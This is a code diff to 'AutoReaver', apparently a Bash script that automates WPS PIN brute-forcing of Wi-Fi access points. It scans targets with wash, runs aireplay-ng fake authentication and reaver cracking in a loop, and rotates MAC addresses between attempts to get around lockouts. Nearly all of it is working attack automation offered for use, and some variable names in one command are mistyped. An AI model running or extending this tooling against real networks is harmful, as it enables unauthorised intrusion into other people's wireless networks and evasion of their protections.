@@ -19,35 +19,13 @@
 ###### Reaver v1.6.6 (the version im using, dont know with older versions)
 ###### Macchanger
 ###### Airmon-ng, Aireplay-ng
-###### Xterm
+###### Terminator
 ###### Wash
 ###################################################################################################################################################
-
-source $(pwd)"/configurationSettings";
-
-clear;
 
 if [ "$EUID" -ne 0 ]; then
 	echo "Please rua as root!!!";
 	exit;
-fi
-
-if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
-	echo "OOOOOPS! You've lost configuration file of AutoReaver: ./configurationSettings";
-	echo "Try to recover this file, or download default version from project site, and try again" && echo "";
-	exit;
-fi
-
-if [[ ! -d "$REAVER_TMP_DIR" ]]; then
-        mkdir -p -m 700 $REAVER_TMP_DIR;
-fi
-
-if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
-        mkdir -p -m 700 $REAVER_SESSION_DIR;
-fi
-
-if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
-        mkdir -p -m 700 $REAVER_CRACKED_DIR;
 fi
 
 ###########################################################################################################################
@@ -75,6 +53,7 @@ setDeviceSettings(){
 	fi
 
 	COUNT_DEV=1;
+	unset option ARR_DEVICES  ERROR;
 	declare -a ARR_DEVICES;
 
 	echoBlue "#		Physical	Device		Driver";
@@ -94,21 +73,71 @@ setDeviceSettings(){
 	echo"";
 
 	while true; do
-	        read -p "Choose WIFI Device: " nChoice;
+	        read -p "Choose WIFI Device: " wifiChoice;
 
-		if [[ $nChoice -le ${#ARR_DEVICES[@]}/3 && $nChoice -gt 0 ]]; then
-			WIFI_CARD_DRIVER="${ARR_DEVICES[(nChoice*3)-1]}";
-			WIFI_CARD_LOGICAL="${ARR_DEVICES[(nChoice*3)-2]}";
-			IEEE_PHY="${ARR_DEVICES[(nChoice*3)-3]}";
+		if [[ $wifiChoice -le ${#ARR_DEVICES[@]}/3 && $wifiChoice -gt 0 ]]; then
+			WIFI_CARD_DRIVER="${ARR_DEVICES[(wifiChoice*3)-1]}";
+			WIFI_CARD_LOGICAL="${ARR_DEVICES[(wifiChoice*3)-2]}";
+			WIFI_CARD_PHY="${ARR_DEVICES[(wifiChoice*3)-3]}";
 			break;
 		else
 			echo "InValid Selection...";
 		fi
 	done
+
+	unset ARR_DEVICES;
 }
 
 setAPSettings(){
-	echo "Under Construction..."
+	echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR && echoBlue "Please Wait...";
+	CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
+	eval $CMD_WASH >>/dev/null;
+
+	unset option AP_LIST ERROR;
+	declare -a AP_LIST;
+
+	while IFS= read -r line; do
+		AP_LIST[${#AP_LIST[@]}]="$line";
+	done < "$REAVER_TMP_DIR/wash.list"
+
+	if [ ${#AP_LIST[@]} -eq 2 ]; then
+		echoRed "No Targets in AP List...";
+		echoBlue "Try Increase WASH Scan Time in configurationSettings File...";
+		echoBlue "Exiting..."
+		sleep 4 && exit;
+	fi
+
+	for (( i=0; i<${#AP_LIST[@]}; i++ )); do
+		case $i in
+			0)
+				echoBlue "#       ${AP_LIST[$i]}";;
+			1)
+				echoBlue  "${AP_LIST[$i]}";;
+			* )
+				echoBlue  "$((i-1))	${AP_LIST[$i]}";;
+		esac
+	done
+
+	while true; do
+		read -p "Choose AP (1-$((${#AP_LIST[@]}-2))) 0 to All): " apChoice;
+
+		if [[ $apChoice -le $((${#AP_LIST[@]}-2)) && $apChoice -ge 1 ]]; then
+			apChoice=$((apChoice+1))
+			AP_BSSID=$(awk '{ print $1 }' <<< "${AP_LIST[$apChoice]}");
+			AP_CHANNEL=$(awk '{ print $2 }' <<< "${AP_LIST[$apChoice]}");
+			AP_ESSID=$(awk '{ print $7 }' <<< "${AP_LIST[$apChoice]}");
+			AP_WPS=$(awk '{ print $4 }' <<< "${AP_LIST[$apChoice]}");
+			AP_LOCK=$(awk '{ print $5 }' <<< "${AP_LIST[$apChoice]}");
+			unset AP_LIST;
+			break;
+		else
+			if [ $apChoice -eq 0 ]; then
+				###### All option will allow this script to loop the wash output result
+				###### Under development......
+				echoRed "All... is Currently Unavailable. Please Select Single Target."
+			fi
+		fi
+	done
 }
 
 setReaverOpt(){
@@ -218,8 +247,11 @@ startMonitor(){
 	fi
 
 	sleep 2 && echoBlue "Starting Monitor Mode on $WIFI_CARD_LOGICAL......";
+
 	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
 	eval $CMD_START >>/dev/null;
+
+	getMonitorName;
 }
 
 stopMonitor(){
@@ -227,8 +259,10 @@ stopMonitor(){
 		getMonitorName;
 	fi
 
-	CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))"
-	eval $CMD_STOP >>/dev/null;
+	if [ ! -z "$WIFI_CARD_MONITOR" ]; then
+		CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))"
+		eval $CMD_STOP >>/dev/null;
+	fi
 }
 
 ###########################################################################################################################
@@ -236,6 +270,26 @@ stopMonitor(){
 ###########################################################################################################################
 
 clear;
+
+source $(pwd)"/configurationSettings";
+
+if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
+        echoRed "Configuration file of AutoReaver: ./configurationSettings not present!!!";
+        echoBlue "Try to recover this file, or download default version from project site, and try again" && echo "";
+        exit;
+fi
+
+if [[ ! -d "$REAVER_TMP_DIR" ]]; then
+        mkdir -p -m 700 $REAVER_TMP_DIR;
+fi
+
+if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
+        mkdir -p -m 700 $REAVER_SESSION_DIR;
+fi
+
+if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
+        mkdir -p -m 700 $REAVER_CRACKED_DIR;
+fi
 
 while true; do
 	PROCEED=0;
@@ -247,21 +301,28 @@ while true; do
 	clear;
 
 	resetDeviceDriver;
-	getRandomMac;
 	startMonitor;
 	sleep 2 && clear;
-	exit;
+	setAPSettings;
+	clear;
 
 	echoWhite "AutoReaver Settings......";
 	echo "";
 	setReaverOpt;
 	clear;
 
-	echoWhite "Device Settings ---------------------------------------------------------";
+	echoWhite "Device Settings --------------------------------------------------------------------";
 	echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
-	echoBlue "Device Monitor: 						$WIFI_CARD_LOGICAL";
-	echoBlue "Device Physical:						$IEEE_PHY";
-	echoWhite "Reaver/Aireplay-ng Settings ---------------------------------------------";
+	echoBlue "Device Logical: 						$WIFI_CARD_LOGICAL";
+	echoBlue "Device Physical:						$WIFI_CARD_PHY";
+	echoBlue "Device Monitor:							$WIFI_CARD_MONITOR";
+	echoWhite "AP Settings ------------------------------------------------------------------------";
+	echoBlue "BSSID:								$AP_BSSID";
+	echoBlue "Channel:							$AP_CHANNEL";
+	echoBlue "WPS:								$AP_WPS";
+	echoBlue "Lock State:							$AP_LOCK";
+	echoBlue "ESSID:								$AP_ESSID";
+	echoWhite "Reaver/Aireplay-ng Settings --------------------------------------------------------";
 	echoBlue "Aireplay-ng Fake Authentication Delay:				$FAKE_AUTH_DELAY_SECONDS";
 	echoBlue "Reaver PIN Attempts before MAC Changing:			$REAVER_PIN_ATTEMPTS";
 	echoBlue "Reaver Delay Between PIN Attempts:				$REAVER_ATTEMPT_DELAY";
@@ -293,17 +354,17 @@ clear;
 SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'_SESSION.wpc';
 
 while true; do
-	CMD_FAKE_AUTH="xterm -e 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $MONITOR_NAME'";
-	eval $CMD_FAKE_AUTH &
+	CMD_FAKE_AUTH="terminator -e 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $MONITOR_NAME'";
+	eval $CMD_FAKE_AUTH >>/dev/null;
 	sleep 4;
 
 	CMD_REAVER="reaver -i $MONITOR_NAME -b $AP_BSSID --channel=$AP_CHANNEL --mac=$RND_MAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT';"
-	eval $CMD_REAVER
+	eval $CMD_REAVER >>/dev/null;
 
 	REAVER_GET_KEY=$(grep -c 'WPS PIN' $REAVER_TMP_DIR'/REAVER_OUTPUT');
 
 	if [[ $REAVER_GET_KEY == 1 ]]; then
-		echoWhite "PIN Cracked......";
+		echoWhite "PIN Found......";
 		sleep 6 && clear;
 		break;
 	else
@@ -311,7 +372,8 @@ while true; do
 		sleep 4 && clear;
 	fi
 
+	stopMonitor;
         resetDeviceDriver;
-	getRandomMac;
+	sleep 1 && getRandomMac;
         startMonitor;
 done
